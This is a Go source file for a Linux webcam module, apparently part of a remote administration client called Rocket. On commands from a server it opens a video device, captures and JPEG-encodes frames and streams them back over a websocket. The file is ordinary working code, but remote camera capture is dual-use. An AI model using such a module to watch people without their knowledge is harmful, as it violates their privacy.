//go:build linux && !stub
// +build linux,!stub

package webcam

import (
	"Rocket/client/common"
	"Rocket/modules"
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"image"
	"image/jpeg"
	"sync"
	"sync/atomic"
	"time"

	"github.com/blackjack/webcam"
)

const (
	// V4L2 format preference order
	formatYUYV webcam.PixelFormat = 0x56595559 // YUYV 4:2:2
	formatMJPEG webcam.PixelFormat = 0x47504A4D // Motion-JPEG
)

var (
	errNotInitialized = errors.New("webcam not initialized")
	errAlreadyRunning = errors.New("webcam already running")
)

// WebcamSession represents an active webcam streaming session
type WebcamSession struct {
	uuid        string
	devicePath  string
	cam         *webcam.Webcam
	format      webcam.PixelFormat
	frameData   chan []byte // JPEG encoded frames
	stop        chan struct{}
	senderStop  chan struct{}
	mu          sync.Mutex
	wg          sync.WaitGroup // FIXED: WaitGroup for graceful shutdown (Issue #12)
	running     bool
	width       uint32
	height      uint32
	fps         uint32

	// Statistics
	seqNumber  uint32
	framesSent uint64
	bytesSent  uint64
	errors     uint64
}

var (
	webcamSession *WebcamSession
	webcamMutex   sync.Mutex
)

// ListDevices returns a list of available webcam devices
func ListDevices() ([]string, error) {
	var deviceList []string

	// Check common video device paths
	for i := 0; i < 10; i++ {
		devicePath := fmt.Sprintf("/dev/video%d", i)

		// Try to open the device
		cam, err := webcam.Open(devicePath)
		if err != nil {
			continue
		}

		// Get device name from capabilities
		name := fmt.Sprintf("Camera %d", i)
		if devName, err := cam.GetName(); err == nil && devName != "" {
			name = devName
		}

		// Check available formats
		formats := cam.GetSupportedFormats()
		hasFormat := false
		for format := range formats {
			if format == formatYUYV || format == formatMJPEG {
				hasFormat = true
				break
			}
		}

		cam.Close()

		if hasFormat {
			deviceList = append(deviceList, fmt.Sprintf("%d: %s (%s)", i, name, devicePath))
		}
	}

	if len(deviceList) == 0 {
		return nil, errors.New("no webcam devices found")
	}

	return deviceList, nil
}

// InitWebcam initializes a new webcam streaming session
func InitWebcam(pack modules.Packet) error {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession != nil && webcamSession.running {
		return errAlreadyRunning
	}

	// Get webcam UUID from packet
	webcamUUID, ok := pack.Data[`webcam`].(string)
	if !ok {
		return errors.New("missing webcam UUID in packet")
	}

	// Create new webcam session
	session := &WebcamSession{
		uuid:       webcamUUID,
		frameData:  make(chan []byte, 30), // Buffer for 30 frames
		stop:       make(chan struct{}),
		senderStop: make(chan struct{}),
		width:      640,
		height:     480,
		fps:        30,
	}

	webcamSession = session
	fmt.Printf("[INFO] Webcam session initialized: %s\n", webcamUUID)
	return nil
}

// HandleSelect handles webcam device selection and starts streaming
func HandleSelect(pack modules.Packet) error {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return errNotInitialized
	}

	// Get device ID from packet
	var deviceID int
	switch v := pack.Data[`device`].(type) {
	case float64:
		deviceID = int(v)
	case string:
		// Parse device ID from string format "N: Device Name..."
		if _, err := fmt.Sscanf(v, "%d:", &deviceID); err != nil {
			return fmt.Errorf("invalid device ID format: %w", err)
		}
	default:
		return errors.New("missing or invalid device ID")
	}

	// Get resolution if specified
	if resolution, ok := pack.Data[`resolution`].(map[string]any); ok {
		if w, ok := resolution[`width`].(float64); ok {
			webcamSession.width = uint32(w)
		}
		if h, ok := resolution[`height`].(float64); ok {
			webcamSession.height = uint32(h)
		}
	}

	// Get FPS if specified
	if fps, ok := pack.Data[`fps`].(float64); ok {
		webcamSession.fps = uint32(fps)
	}

	// Construct device path
	devicePath := fmt.Sprintf("/dev/video%d", deviceID)
	webcamSession.devicePath = devicePath

	// Open webcam device
	cam, err := webcam.Open(devicePath)
	if err != nil {
		return fmt.Errorf("failed to open webcam %s: %w", devicePath, err)
	}

	// Try to set format (prefer MJPEG for better compression, fallback to YUYV)
	formats := cam.GetSupportedFormats()
	var selectedFormat webcam.PixelFormat

	// Check for MJPEG support
	for format := range formats {
		if format == formatMJPEG {
			selectedFormat = formatMJPEG
			break
		}
	}

	// Fallback to YUYV if MJPEG not available
	if selectedFormat == 0 {
		for format := range formats {
			if format == formatYUYV {
				selectedFormat = formatYUYV
				break
			}
		}
	}

	if selectedFormat == 0 {
		cam.Close()
		return errors.New("no supported pixel format found (need MJPEG or YUYV)")
	}

	// Set format and frame size
	resultFormat, _, _, err := cam.SetImageFormat(selectedFormat, webcamSession.width, webcamSession.height)
	if err != nil {
		cam.Close()
		return fmt.Errorf("failed to set image format: %w", err)
	}
	selectedFormat = resultFormat // Use the actual format returned by the driver

	webcamSession.cam = cam
	webcamSession.format = selectedFormat

	// Start capture
	if err := startCapture(webcamSession); err != nil {
		cam.Close()
		return fmt.Errorf("failed to start capture: %w", err)
	}

	// FIXED: Start packet sender with WaitGroup (Issue #12)
	webcamSession.wg.Add(1)
	go webcamPacketSender(webcamSession)

	webcamSession.running = true
	fmt.Printf("[INFO] Webcam capture started: %s (%dx%d @%dfps)\n",
		devicePath, webcamSession.width, webcamSession.height, webcamSession.fps)
	return nil
}

// webcamPacketSender reads encoded frames from channel and sends packets to server
func webcamPacketSender(session *WebcamSession) {
	defer session.wg.Done() // FIXED: Signal completion (Issue #12)
	defer fmt.Printf("[INFO] Webcam packet sender stopped\n")

	for {
		select {
		case <-session.senderStop:
			return
		case frameData, ok := <-session.frameData:
			if !ok {
				return
			}

			// Check connection
			common.Mutex.RLock()
			conn := common.WSConn
			common.Mutex.RUnlock()

			if conn == nil {
				atomic.AddUint64(&session.errors, 1)
				fmt.Printf("[WARN] No connection available, dropping webcam frame\n")
				continue
			}

			// Increment sequence number
			seq := atomic.AddUint32(&session.seqNumber, 1)

			// Create packet with base64 encoded JPEG frame
			packet := modules.Packet{
				Act: "WEBCAM_DATA",
				Data: map[string]any{
					"uuid":      session.uuid,
					"data":      base64.StdEncoding.EncodeToString(frameData),
					"seq":       seq,
					"timestamp": time.Now().UnixMilli(),
					"size":      len(frameData),
					"width":     session.width,
					"height":    session.height,
				},
			}

			// Send packet
			if err := conn.SendPack(packet); err != nil {
				atomic.AddUint64(&session.errors, 1)
				fmt.Printf("[ERROR] Failed to send webcam packet: %v\n", err)
			} else {
				atomic.AddUint64(&session.framesSent, 1)
				atomic.AddUint64(&session.bytesSent, uint64(len(frameData)))
			}
		}
	}
}

// startCapture starts the webcam capture
func startCapture(session *WebcamSession) error {
	// Start streaming
	if err := session.cam.StartStreaming(); err != nil {
		return fmt.Errorf("failed to start streaming: %w", err)
	}

	// FIXED: Start capture goroutine with WaitGroup (Issue #12)
	session.wg.Add(1)
	go captureLoop(session)

	return nil
}

// captureLoop continuously captures frames from webcam
func captureLoop(session *WebcamSession) {
	defer session.wg.Done() // FIXED: Signal completion (Issue #12)
	defer func() {
		if session.cam != nil {
			session.cam.StopStreaming()
		}
		fmt.Printf("[INFO] Webcam capture loop stopped\n")
	}()

	// FIXED: Use ticker for precise frame timing (Issue #7)
	frameDuration := time.Second / time.Duration(session.fps)
	ticker := time.NewTicker(frameDuration)
	defer ticker.Stop()

	fmt.Printf("[INFO] Webcam capture loop started with ticker: %v\n", frameDuration)

	for {
		select {
		case <-session.stop:
			return

		case <-ticker.C:
			// FIXED: Non-blocking frame wait (100ms timeout per tick)
			// V4L2 WaitForFrame can block, so use short timeout
			err := session.cam.WaitForFrame(1) // 1 second max wait
			if err != nil {
				switch err.(type) {
				case *webcam.Timeout:
					// Timeout is normal, continue to next tick
					atomic.AddUint64(&session.errors, 1)
					continue
				default:
					fmt.Printf("[ERROR] Frame wait error: %v\n", err)
					atomic.AddUint64(&session.errors, 1)
					continue
				}
			}

			// Read frame
			frame, err := session.cam.ReadFrame()
			if err != nil {
				fmt.Printf("[ERROR] Frame read error: %v\n", err)
				atomic.AddUint64(&session.errors, 1)
				continue
			}

			if len(frame) == 0 {
				continue
			}

			// Encode frame as JPEG
			jpegData, err := encodeFrame(frame, session)
			if err != nil {
				fmt.Printf("[ERROR] Frame encoding error: %v\n", err)
				atomic.AddUint64(&session.errors, 1)
				continue
			}

			// Send encoded frame
			select {
			case session.frameData <- jpegData:
				// Successfully queued
			default:
				// Channel full, drop frame
				fmt.Printf("[WARN] Frame data channel full, dropping frame\n")
				atomic.AddUint64(&session.errors, 1)
			}
		}
	}
}

// encodeFrame encodes raw frame data to JPEG
func encodeFrame(frame []byte, session *WebcamSession) ([]byte, error) {
	var img image.Image
	var err error

	switch session.format {
	case formatMJPEG:
		// MJPEG is already JPEG compressed, return as-is
		return frame, nil

	case formatYUYV:
		// Convert YUYV to RGB
		img, err = yuyvToImage(frame, int(session.width), int(session.height))
		if err != nil {
			return nil, err
		}

	default:
		return nil, fmt.Errorf("unsupported format: %d", session.format)
	}

	// Encode to JPEG
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// yuyvToImage converts YUYV 4:2:2 format to RGB image
func yuyvToImage(yuyv []byte, width, height int) (image.Image, error) {
	if len(yuyv) < width*height*2 {
		return nil, errors.New("insufficient YUYV data")
	}

	img := image.NewRGBA(image.Rect(0, 0, width, height))

	for y := 0; y < height; y++ {
		for x := 0; x < width; x += 2 {
			idx := (y*width + x) * 2

			y0 := int(yuyv[idx])
			u := int(yuyv[idx+1])
			y1 := int(yuyv[idx+2])
			v := int(yuyv[idx+3])

			// Convert YUV to RGB (ITU-R BT.601 conversion)
			c := y0 - 16
			d := u - 128
			e := v - 128

			r := clip((298*c + 409*e + 128) >> 8)
			g := clip((298*c - 100*d - 208*e + 128) >> 8)
			b := clip((298*c + 516*d + 128) >> 8)

			// Set pixel directly in RGBA image
			offset := img.PixOffset(x, y)
			img.Pix[offset] = uint8(r)
			img.Pix[offset+1] = uint8(g)
			img.Pix[offset+2] = uint8(b)
			img.Pix[offset+3] = 255 // Alpha

			// Second pixel
			c = y1 - 16
			r = clip((298*c + 409*e + 128) >> 8)
			g = clip((298*c - 100*d - 208*e + 128) >> 8)
			b = clip((298*c + 516*d + 128) >> 8)

			if x+1 < width {
				offset = img.PixOffset(x+1, y)
				img.Pix[offset] = uint8(r)
				img.Pix[offset+1] = uint8(g)
				img.Pix[offset+2] = uint8(b)
				img.Pix[offset+3] = 255 // Alpha
			}
		}
	}

	return img, nil
}

// clip clips value to 0-255 range
func clip(value int) int {
	if value < 0 {
		return 0
	}
	if value > 255 {
		return 255
	}
	return value
}

// GetFrameData returns the channel for reading encoded frames
func GetFrameData() <-chan []byte {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return nil
	}
	return webcamSession.frameData
}

// PingWebcam handles keep-alive ping
func PingWebcam(pack modules.Packet) {
	// Webcam session is kept alive via the ping mechanism
	// No additional action needed
}

// KillWebcam stops the webcam streaming session
func KillWebcam(pack modules.Packet) {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return
	}

	webcamSession.mu.Lock()
	wasRunning := webcamSession.running
	if webcamSession.running {
		close(webcamSession.stop)
		close(webcamSession.senderStop)
		webcamSession.running = false
	}
	webcamSession.mu.Unlock()

	if wasRunning {
		// FIXED: Wait for goroutines to finish properly (Issue #12)
		fmt.Printf("[INFO] Waiting for webcam goroutines to finish...\n")
		webcamSession.wg.Wait()
		fmt.Printf("[INFO] All webcam goroutines stopped\n")
	}

	// Print statistics
	frames := atomic.LoadUint64(&webcamSession.framesSent)
	bytes := atomic.LoadUint64(&webcamSession.bytesSent)
	errors := atomic.LoadUint64(&webcamSession.errors)
	fmt.Printf("[INFO] Webcam session statistics - Frames: %d, Bytes: %d, Errors: %d\n",
		frames, bytes, errors)

	// Clean up resources
	if webcamSession.frameData != nil {
		close(webcamSession.frameData)
	}

	if webcamSession.cam != nil {
		webcamSession.cam.Close()
		webcamSession.cam = nil
	}

	webcamSession = nil
	fmt.Printf("[INFO] Webcam session killed\n")
}

// GetSessionUUID returns the current webcam session UUID
func GetSessionUUID() string {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return ""
	}
	return webcamSession.uuid
}

// IsRunning returns whether webcam is currently streaming
func IsRunning() bool {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	return webcamSession != nil && webcamSession.running
}

// Cleanup cleans up webcam resources on shutdown
func Cleanup() {
	KillWebcam(modules.Packet{})
}
